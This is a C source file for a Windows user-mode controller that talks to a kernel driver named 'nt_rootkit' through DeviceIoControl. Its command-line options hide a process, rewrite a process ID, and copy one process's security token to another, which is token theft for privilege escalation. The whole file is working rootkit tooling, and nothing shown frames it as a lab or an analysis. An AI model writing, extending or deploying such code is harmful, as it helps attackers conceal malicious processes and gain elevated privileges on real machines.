#include <stdio.h>
#include <Windows.h>
#include "ioctl_globals.h"

int main(int argc, char* argv[], char* envp[])
{
        BOOL status = FALSE;
        HANDLE device = INVALID_HANDLE_VALUE;
        DWORD ret_bytes = 0;
        CHAR input_buf[128] = {0};
        CHAR output_buf[128] = {0};

        device = CreateFileW(L"\\\\.\\nt_rootkit",
                GENERIC_WRITE | GENERIC_READ | GENERIC_EXECUTE, 0, 0,
                OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);

        if (argc > 1) {
                switch (*argv[1]) {
                case 'h':
                        if (atoi(argv[2]) > 0) {
                                printf("sending command to hide %d...\n",
                                        atoi(argv[2]));
                                RtlCopyMemory(input_buf, argv[2],
                                              strlen(argv[2]));
                                status = DeviceIoControl(
                                        device, IO_HIDE_PROC,
                                        input_buf, sizeof(input_buf), 
                                        output_buf, sizeof(output_buf),
                                        &ret_bytes, (LPOVERLAPPED)NULL
                                );
                        }
                        break;
                case 's':
                        if (atoi(argv[2]) > 0) {
                                printf("sending command to set %d...\n",
                                        atoi(argv[2]));
                                RtlCopyMemory(input_buf, argv[2],
                                        strlen(argv[2]));
                                status = DeviceIoControl(
                                        device, IO_PID_PROC,
                                        input_buf, sizeof(input_buf),
                                        output_buf, sizeof(output_buf),
                                        &ret_bytes, (LPOVERLAPPED)NULL);
                        }
                        break;
                case 't':
                        if (atoi(argv[2]) > 0) {
                                if (atoi(argv[3]) > 0) {
                                        printf("copying source token from %d "
                                               "to destination at %d...\n", 
                                                atoi(argv[2]), atoi(argv[3]));
                                        token_steal ts;
                                        ts.src = atoi(argv[2]);
                                        ts.dest = atoi(argv[3]);

                                        status = DeviceIoControl(
                                                device, IO_TOKEN_PROC,
                                                &ts, sizeof(ts),
                                                output_buf, sizeof(output_buf),
                                                &ret_bytes, (LPOVERLAPPED)NULL);
                                }
                        }
                        break;
                case '?':
                        printf("\nh [PID]\t\tHide a process\n"
                               "s [PID]\t\tChange a PID to 0x1337\n"
                               "t [PID0] [PID1]\tGive pid1 pid0's token\n"
                               "? \t\tDisplays this menu\n\n");
                        break;
                }
        }

        printf("message from kernel: [%s] Buffer size: %d\n",
               output_buf, ret_bytes);

        CloseHandle(device);
        return status;
}